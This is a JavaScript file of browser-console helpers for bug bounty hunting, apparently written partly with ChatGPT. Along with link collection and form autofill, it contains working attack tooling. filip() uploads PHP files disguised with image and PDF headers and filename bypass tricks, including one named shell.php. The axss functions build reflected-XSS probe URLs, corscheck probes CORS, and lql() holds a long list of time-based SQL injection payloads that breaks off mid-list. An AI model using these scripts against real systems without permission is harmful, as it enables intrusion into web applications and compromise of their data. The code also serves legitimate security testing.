// Function create using ChatGPT
// Status: not tested for now
// I need to test it later) I hope this will help for manual bug hunters, and especially in sites where automation is strongly getting blocked
// My prompt
/*
now make it a function  and collect all iframes src links inside iframe key and other inside a key   like   {'iframe': [....], 'a': []}   
and also add same thing for form  and after action  check with regexp if there is no action="http*"  then  url should be window.location.href+"/"+formActionLink  if non window.location.href doesn't have  / in the end and  
if  formActionLink doesn't have / in it's begining  also with same logic get valid url   considering that action can also be =./endpoint   so here we also have to check if window.location.href is ending with /  thean substring 
fromActionLink 2 else substring 1  so the slash will come and concatenate with window.location.href and we will get valid url  got me??      also with same logic  get all input type=hidden     in inp.hidden   this  all should be  tags  object  
so if I select tags.inp.hidden  I want output like    [{'value':'text1', 'name':'some'}, {'value':'some', 'name':'some'}]   and if u can generate not only for input hidden but for more input types that will help with finding RXSS  
u can put alll these  inn function all  after  calling all()    tags object should be generating  with all described things I told
*/


function collectTags(document) {
    const tags = {
        'a': [],
        'iframe': [],
        'form': []
    };

    // Collect all <a>, <iframe>, and <form> elements
    document.querySelectorAll("a, iframe, form").forEach(element => {
        if (element.tagName === 'A') {
            tags['a'].push(element.href);
        } else if (element.tagName === 'IFRAME') {
            tags['iframe'].push(element.src);
        } else if (element.tagName === 'FORM') {
            const formObj = {
                'action': validateFormAction(element.action),
                'inputs': collectFormInputs(element)
            };
            tags['form'].push(formObj);
        }
    });

    return tags;
}

// Function to validate form action URL
function validateFormAction(action) {
    const regex = /^http(s)?:\/\//;
    if (!regex.test(action)) {
        const baseUrl = window.location.href.endsWith('/') ? window.location.href : window.location.href + '/';
        const formActionLink = action.startsWith('./') ? action.substring(2) : action;
        const validUrl = baseUrl + (formActionLink.startsWith('/') ? formActionLink.substring(1) : formActionLink);
        return validUrl;
    }
    return action;
}

// Function to collect inputs within form
function collectFormInputs(formElement) {
    const inputs = [];
    formElement.querySelectorAll('input').forEach(input => {
        if (input.type === 'hidden') {
            inputs.push({
                'value': input.value,
                'name': input.name
            });
        }
        // Add more conditions here for other input types if needed
    });
    return inputs;
}

// Example usage
//const tags = collectTags(document);
//console.log(tags);

function afill(k, mail) {
  const text = k || "Lorem ipsum dolor sit amet";
  const email = mail || "lorem@ipsum.com";
  const number = "12345";
  const pass = "Pass_12345!";
  const date = "2025-07-02";

  document.querySelectorAll("input, textarea, select").forEach(el => {
    if (el.disabled || el.readOnly) return;

    switch (el.type) {
      case "email":
        el.value = email;
        break;
      case "text":
      case "search":
      case "":
        el.value = text;
        break;
      case "password":
        el.value = pass;
        break;
      case "number":
      case "tel":
        el.value = number;
        break;
      case "date":
        el.value = date;
        break;
      case "url":
        el.value = "https://example.com";
        break;
      case "checkbox":
      case "radio":
        el.checked = true;
        break;
      default:
        if (el.tagName === "TEXTAREA") {
          el.value = text + " - textarea";
        } else if (el.tagName === "SELECT") {
          el.selectedIndex = 1;
        }
    }
  });

  console.log(`✅ Autofilled with text: "${text}", email: "${email}", and password: "${pass}"`);
}
function axss2() {
    const inputs = document.querySelectorAll('input[type=text]');
    const rawPayload = "axss'\"<";                // readable payload
    const payload = encodeURIComponent(rawPayload); // safely encoded for URL
    const params = [];

    for (const el of inputs) {
        if (el.id && el.id.trim() !== "") {
            params.push(encodeURIComponent(el.id) + "=" + payload);
        }
    }

    if (params.length > 0) {
        const injection = "?" + params.join("&");
        const testUrl = window.location.origin + window.location.pathname + injection;
        console.log("Visit & inspect:", testUrl);
    } else {
        console.log("Nothing here — no text inputs with ids found.");
    }
}
function axss() {
    let inputs = document.getElementsByTagName("input");
    let payload = "axss%27%22%3c";
    let params = [];
    
    for (let i = 0; i < inputs.length; i++) {
        // Check if name attribute exists and is not empty
        if (inputs[i].name && inputs[i].name.trim() !== "") {
            params.push(inputs[i].name + "=" + payload);
        }
    }
    
    if (params.length > 0) {
        let injection = "?" + params.join("&");
        let testUrl = window.location.origin + window.location.pathname + injection;
        console.log("Visit & inspect: " + testUrl);
    } else {
        console.log("Nothing here, look somewhere else with inputs/forms");
    }
}
function brute() {
    return "";
}async function corscheck(num=0) {
    const input = prompt("Enter domains (newline separated):");
    if (!input) return;
  
    const domains = input.split('\n').map(d => d.trim()).filter(Boolean);
    const successful = [];
  
    for (const domain of domains) {
      const url = `https://${domain}/`;
  
      try {
        const res = num==0 ? await fetch(url, { mode: 'cors' }) : await fetch(url, { mode: 'cors', credentials:'include' }) ;
        console.log(`✅ Fetched: ${url}`);
        successful.push(domain);
      } catch (e) {
        console.log(`❌ Failed: ${url}`);
      }
    }
  
    console.log(`\n🎯 Accessible subs:\n`, successful.join('\n'));
  }
// doko(searchString) — require a string; searches raw/urlenc/urldec/minimal-base64 variants
async function doko(searchString) {
  const css = {
    hdr: "color:#fff;background:#111;padding:5px 8px;border-radius:6px;font-weight:700",
    ok: "color:#bada55;font-weight:700",
    src: "color:#0ff",
    info: "color:#ccc"
  };

  if (!searchString || typeof searchString !== "string" || searchString.trim() === "") {
    console.log("%cUsage: doko('string_to_lookup') — provide a non-empty string to search for.", css.hdr);
    return { error: "usage", message: "doko('string_to_lookup')" };
  }
  const needleRaw = searchString;
  // safe encode/decode
  const safeEncode = s => {
    try { return encodeURIComponent(s); } catch (e) { return s; }
  };
  const safeDecode = s => {
    try { return decodeURIComponent(s); } catch (e) { return s; }
  };

  // m64 logic translated exactly from your bash: base64(s), base64("a"+s), base64("aa"+s)
  function m64Variants(s) {
    if (!s) return [];
    function b64(inp) {
      try {
        // handle unicode -> UTF-8 safe btoa
        return btoa(unescape(encodeURIComponent(inp)));
      } catch (e) {
        try { return btoa(inp); } catch (ee) { return ""; }
      }
    }
    const aaaRaw = b64(s) || "";
    const bbbRaw = b64("a" + s) || "";
    const cccRaw = b64("aa" + s) || "";

    const aaa = aaaRaw.replace(/=+$/, "");
    const bbb = bbbRaw.replace(/=+$/, "");
    const ccc = cccRaw.replace(/=+$/, "");

    const out = new Set();
    if (aaa.length > 1) out.add(aaa.slice(0, aaa.length - 1));          // ${aaa:0:${#aaa}-1}
    if (bbb.length > 3) out.add(bbb.slice(2, bbb.length - 1));         // ${bbb:2:${#bbb}-1-2}
    if (ccc.length > 4) out.add(ccc.slice(3, ccc.length - 1));         // ${ccc:3:${#ccc}-1-3}
    return Array.from(out);
  }

  // generate variants to search for
  const variantsSet = new Set();
  variantsSet.add(needleRaw);
  variantsSet.add(safeDecode(needleRaw));
  variantsSet.add(safeEncode(needleRaw));
  try {
    // full base64 without padding
    const fullb = btoa(unescape(encodeURIComponent(needleRaw))).replace(/=+$/, "");
    if (fullb) variantsSet.add(fullb);
  } catch (e) {}
  m64Variants(safeDecode(needleRaw)).forEach(v => variantsSet.add(v));

  // canonicalize variants array
  const variants = Array.from(variantsSet).filter(Boolean);

  // helper to test if any variant exists in text
  function findVariantsInText(text) {
    if (!text) return [];
    const found = new Set();
    for (const v of variants) {
      if (!v || v.length < 3) continue; // skip tiny to reduce noise
      if (text.indexOf(v) !== -1) found.add(v);
    }
    return Array.from(found);
  }

  // gather sync sources
  const sources = {};
  try { sources["location.href"] = location.href || ""; } catch (e) { sources["location.href"] = "[inaccessible]"; }
  try { sources["location.search"] = location.search || ""; } catch (e) { sources["location.search"] = "[inaccessible]"; }
  try { sources["location.hash"] = location.hash || ""; } catch (e) { sources["location.hash"] = "[inaccessible]"; }
  try { sources["location.pathname"] = location.pathname || ""; } catch (e) { sources["location.pathname"] = "[inaccessible]"; }

  try { sources["document.outerHTML"] = document.documentElement ? document.documentElement.outerHTML : ""; } catch (e) { sources["document.outerHTML"] = "[inaccessible]"; }

  try { sources["document.cookie"] = document.cookie || ""; } catch (e) { sources["document.cookie"] = "[inaccessible]"; }

  try { sources["localStorage"] = JSON.stringify(localStorage); } catch (e) { sources["localStorage"] = "[inaccessible]"; }
  try { sources["sessionStorage"] = JSON.stringify(sessionStorage); } catch (e) { sources["sessionStorage"] = "[inaccessible]"; }

  // indexedDB best-effort: enumerate DBs and try to peek a few values (non-blocking)
  async function gatherIndexedDBSnippets() {
    const out = [];
    try {
      if (typeof indexedDB !== "undefined" && typeof indexedDB.databases === "function") {
        const dbs = await indexedDB.databases();
        for (const dbInfo of dbs) {
          const name = dbInfo.name || "[unknown]";
          try {
            const openReq = indexedDB.open(name);
            const db = await new Promise((res) => {
              openReq.onsuccess = () => res(openReq.result);
              openReq.onerror = () => res(null);
              // versionchange blocked? fallback later
            });
            if (!db) { out.push(`${name} :: [open failed]`); continue; }
            const storeNames = Array.from(db.objectStoreNames);
            if (storeNames.length === 0) { out.push(`${name} :: [no stores]`); db.close(); continue; }
            // try to read first value from first store (lightweight)
            const txn = db.transaction(storeNames[0], "readonly");
            const store = txn.objectStore(storeNames[0]);
            const first = await new Promise((res) => {
              const cur = store.openCursor();
              cur.onsuccess = e => {
                const c = cur.result;
                if (!c) res(null);
                else res(c.value);
              };
              cur.onerror = () => res(null);
            });
            out.push(`${name} :: stores=${storeNames.join(",")} :: sample=${first ? JSON.stringify(first).slice(0,200) : "[no-sample]"}`);
            db.close();
          } catch (e) {
            out.push(`${name} :: [error reading DB]`);
          }
        }
      } else {
        out.push("[indexedDB.databases() not supported]");
      }
    } catch (e) {
      out.push("[indexedDB access error]");
    }
    return out.join("\n");
  }

  // get indexedDB content (best-effort)
  sources["indexedDB_snippets"] = await gatherIndexedDBSnippets();

  // run search across sources
  const results = { query: needleRaw, variants, bySource: {} };
  for (const [k, v] of Object.entries(sources)) {
    results.bySource[k] = { found: [], sample: (typeof v === "string" && v.length > 0) ? String(v).slice(0, 300) : v };
    try {
      const f = findVariantsInText(String(v || ""));
      if (f.length) results.bySource[k].found = f;
    } catch (e) {
      results.bySource[k].error = "scan error";
    }
  }

  // also check direct storage keys (local/session) names for the raw query
  try {
    results.bySource["localStorage_keys"] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (!key) continue;
      if (variants.some(x => key.indexOf(x) !== -1)) {
        results.bySource["localStorage_keys"].push({ key, valueSample: (localStorage.getItem(key) || "").slice(0,200) });
      }
    }
  } catch (e) { /* ignore */ }

  try {
    results.bySource["sessionStorage_keys"] = [];
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (!key) continue;
      if (variants.some(x => key.indexOf(x) !== -1)) {
        results.bySource["sessionStorage_keys"].push({ key, valueSample: (sessionStorage.getItem(key) || "").slice(0,200) });
      }
    }
  } catch (e) { /* ignore */ }

// count matches and print pretty console output
let totalMatches = 0;
console.log("%cdoko() report", css.hdr);
console.log("%cQuery:%c " + needleRaw, css.src, css.info);

for (const [sName, info] of Object.entries(results.bySource)) {
  const hits = (info.found && info.found.length) ? info.found.length : 0;
  if (hits > 0) {
    totalMatches += hits;
    console.log("%cSource: " + sName + "  |  matches: " + hits, css.ok);
    info.found.forEach(x => console.log("%c  • " + x, css.ok));
  }
}

// also list key matches
if (results.bySource.localStorage_keys && results.bySource.localStorage_keys.length) {
  console.log("%clocalStorage keys matching variants:", css.src);
  results.bySource.localStorage_keys.forEach(k =>
    console.log("%c  • " + k.key + " → " + k.valueSample, css.ok)
  );
  totalMatches += results.bySource.localStorage_keys.length;
}
if (results.bySource.sessionStorage_keys && results.bySource.sessionStorage_keys.length) {
  console.log("%csessionStorage keys matching variants:", css.src);
  results.bySource.sessionStorage_keys.forEach(k =>
    console.log("%c  • " + k.key + " → " + k.valueSample, css.ok)
  );
  totalMatches += results.bySource.sessionStorage_keys.length;
}

if (totalMatches === 0) {
  console.log("%cNo matches found for provided string in scanned sources.", css.info);
} else {
  console.log("%cTotal matches: " + totalMatches, css.ok);
}


  // return full structured results for extension use
  results.summary = { totalMatches, sourcesScanned: Object.keys(sources).length };
  return results;
}
/////////////////////////
//////    NOTE    ///////
/////////////////////////
// Any of these two functions can be used, but there is a small difference between them tho
// When using first one, let's say you do alert() each time, whenever you close the alert then only the timer will continue,
// meanwhile the second script won't care, so if you press alert late intentanoally you will see next alert poping up at light speed,
// so I think in scripts that require user interaction you can use the first one
// but tbh I don't know in what any other situations this could cause trouble or advantage over one another, so I will just keep both
//
/////////////////////////
///  example scripts  ///
/////////////////////////
//  /* This will generate all 4 digit numbers and log them with pause of 0.2 seconds each time */
// easyLoopLimiter( 0, 10000, 200, "let a = (i - ( i % 1000 ) ) / 1000; let b = ( i - ( i % 100 ) ) / 100; let c = ( i - ( i % 10) ) / 10; let d = i % 10; console.log( a.toString() + b.toString() + c.toString() + d.toString() )" )
//
// /* Or you can have your function maybe for making a fetch requests continously or something custom? */ 
// easyLoopLimiter( 0, 1000, 300, 'yourCustomFunction()')
//
// /* You can pass increasing parameter i to your custom function like this */
// easyLoopLimiter( 0, 5, 100, 'custom(i)' );  function custom(n) { alert(n) }
//
//

function easyLoopLimiter(loopStrtNum, loopEndNum, timeToPause, yourFunction) {

    function loop(i) {
        if (i < loopEndNum) {
            eval(yourFunction);
            setTimeout(() => {
                i++;
                loop(i)
            }, timeToPause);
        } else {
            return;
        }
    }

    setTimeout(() => {
        loop(loopStrtNum)
    }, timeToPause);


}


function easyLoopLimiter2(loopStrtNum, loopEndNum, timeToPause, yourFunction) {

    let i = loopStrtNum;
    let a = setInterval(() => {
        eval(yourFunction);
        i++;
        if (i == loopEndNum) {
            clearInterval(a)
        }
    }, timeToPause)

}
function filip(fileInput = null, formElement = null) {
    fileInput = fileInput || document.querySelector('input[type="file"]');
    formElement = formElement || document.querySelector('form');

    if (!fileInput || !(fileInput instanceof HTMLInputElement)) {
        console.warn("File input not found");
        return;
    }

    if (!formElement || !(formElement instanceof HTMLFormElement)) {
        console.warn("Form element not found");
        return;
    }

    const payload = '<?php echo "I am POC"; ?>';

    const baseFiles = [
        { ext: 'png', mime: 'image/png', header: [0x89, 0x50, 0x4E, 0x47] },
        { ext: 'jpg', mime: 'image/jpeg', header: [0xFF, 0xD8, 0xFF] },
        { ext: 'gif', mime: 'image/gif', header: [0x47, 0x49, 0x46, 0x38] },
        { ext: 'pdf', mime: 'application/pdf', header: [0x25, 0x50, 0x44, 0x46] }
    ];

    const testFiles = [];

    for (const f of baseFiles) {
        testFiles.push(
            { name: `${f.ext}.php`, mime: f.mime, header: f.header },
            { name: `test.${f.ext}%00.php`, mime: f.mime, header: f.header },
            { name: `test.php%00.${f.ext}`, mime: f.mime, header: f.header },
            { name: `test.php;.${f.ext}`, mime: f.mime, header: f.header },
            { name: `test.${f.ext};.php`, mime: f.mime, header: f.header }
        );
    }

    testFiles.push({
        name: 'shell.php',
        mime: 'application/x-php',
        header: [0x3C, 0x3F, 0x70, 0x68] // "<?ph"
    });

    const generateBlob = (headerBytes, phpCode, mimeType) => {
        const header = new Uint8Array(headerBytes);
        const code = new TextEncoder().encode(phpCode);
        const full = new Uint8Array(header.length + code.length);
        full.set(header, 0);
        full.set(code, header.length);
        return new Blob([full], { type: mimeType });
    };

    const runTests = async () => {
        const action = formElement.getAttribute('action') || window.location.href;
        const method = (formElement.getAttribute('method') || 'GET').toUpperCase();

        for (let file of testFiles) {
            const blob = generateBlob(file.header, payload, file.mime);
            const testFile = new File([blob], file.name, { type: file.mime });

            const formData = new FormData();

            // Clone all inputs (hidden or not)
            formElement.querySelectorAll('input').forEach(input => {
                if (input.type === 'file') {
                    formData.append(input.name || 'file', testFile);
                } else if (input.name) {
                    formData.append(input.name, input.value);
                }
            });

            console.log(`[*] Uploading: ${file.name} (MIME: ${file.mime})`);

            try {
                const res = await fetch(action, {
                    method: method,
                    body: formData,
                    credentials: 'include'
                });

                const text = await res.text();
                console.log(`[+] Status: ${res.status} | Length: ${text.length}`);
                if (/I am POC/.test(text)) {
                    console.warn(`[!!!] Found payload execution in response! => ${file.name}`);
                }

            } catch (err) {
                console.error(`[!] Fetch failed:`, err);
            }

            await new Promise(r => setTimeout(r, 1500));
        }

        alert("✅ filip() completed — check console + network tab!");
    };
// block any native submission
formElement.addEventListener('submit', e => e.preventDefault());
formElement.querySelectorAll('button, input[type="submit"]').forEach(btn => {
    btn.addEventListener('click', e => e.preventDefault());
});
    runTests();
}
function showhtml() {
// dumb function but I love it, make sure you are in data:, or in safe domain just in case
let a=prompt(); document.body.innerHTML=a;
}
function links() {
// Define a regular expression to match URLs
const urlRegex = /\bhttps?:\/\/[^\s/$.?#].[^\s]*\b/g;

// Get the text content of the document
const documentText = document.body.innerHTML;

// Use the regular expression to find all URLs in the document
const urls = documentText.match(urlRegex);

// Log the extracted URLs to the console
return urls;

}
async function lql() {
    // --- Payloads list ---
    const payloads = [
`,(select * from (select(sleep(10)))a)`,
`%2c(select%20*%20from%20(select(sleep(10)))a)`,
`';WAITFOR DELAY '0:0:30'--`,
`sleep(10)#`,
`1 or sleep(10)#`,
`" or sleep(10)#`,
`' or sleep(10)#`,
`" or sleep(10)="`,
`' or sleep(10)='`,
`1) or sleep(10)#`,
`") or sleep(10)="`,
`') or sleep(10)='`,
`1)) or sleep(10)#`,
`")) or sleep(10)="`,
`')) or sleep(10)='`,
`;waitfor delay '0:0:10'--`,
`);waitfor delay '0:0:10'--`,
`';waitfor delay '0:0:10'--`,
`";waitfor delay '0:0:10'--`,
`');waitfor delay '0:0:10'--`,
`");waitfor delay '0:0:10'--`,
`));waitfor delay '0:0:10'--`,
`'));waitfor delay '0:0:10'--`,
`"));waitfor delay '0:0:10'--`,
`pg_sleep(10)--`,
`1 or pg_sleep(10)--`,
`" or pg_sleep(10)--`,
`' or pg_sleep(10)--`,
`1) or pg_sleep(10)--`,
`") or pg_sleep(10)--`,
`') or pg_sleep(10)--`,
`1)) or pg_sleep(10)--`,
`")) or pg_sleep(10)--`,
`')) or pg_sleep(10)--`,
`AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe`,
`AND (SELECT * FROM (SELECT(SLEEP(10)))YjoC) AND '%'='`,
`AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)`,
`AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)--`,
`AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)#`,
`SLEEP(10)#`,
`SLEEP(10)--`,
`SLEEP(10)="`,
`SLEEP(10)='`,
`or SLEEP(10)`,
`or SLEEP(10)#`,
`or SLEEP(10)--`,
`or SLEEP(10)="`,
`or SLEEP(10)='`,
`waitfor delay '00:00:10'`,
`waitfor delay '00:00:10'--`,
`waitfor delay '00:00:10'#`,
`pg_SLEEP(10)`,
`pg_SLEEP(10)--`,
`pg_SLEEP(10)#`,
`or pg_SLEEP(10)`,
`or pg_SLEEP(10)--`,
`or pg_SLEEP(10)#`,
`AnD SLEEP(10)`,
`AnD SLEEP(10)--`,
`AnD SLEEP(10)#`,
`&&SLEEP(10)`,
`&&SLEEP(10)--`,
`&&SLEEP(10)#`,
`' AnD SLEEP(10) ANd '1`,
`'&&SLEEP(10)&&'1`,
`ORDER BY SLEEP(10)`,
`ORDER BY SLEEP(10)--`,
`ORDER BY SLEEP(10)#`,
`(SELECT * FROM (SELECT(SLEEP(10)))ecMj)`,
`(SELECT * FROM (SELECT(SLEEP(10)))ecMj)#`,
`(SELECT * FROM (SELECT(SLEEP(10)))ecMj)--`,
`+ SLEEP(10) + '`,
`SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`,
` ORDER BY SLEEP(10)`,
` ORDER BY 1,SLEEP(10)`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A'))`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`,
` ORDER BY SLEEP(10)#`,
` ORDER BY 1,SLEEP(10)#`,
` ORDER BY 1,SLEEP(10),3#`,
` ORDER BY 1,SLEEP(10),3,4#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#`,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#`,
` ORDER BY SLEEP(10)-- `,
` ORDER BY 1,SLEEP(10)-- `,
` ORDER BY 1,SLEEP(10),3-- `,
` ORDER BY 1,SLEEP(10),3,4-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- `,
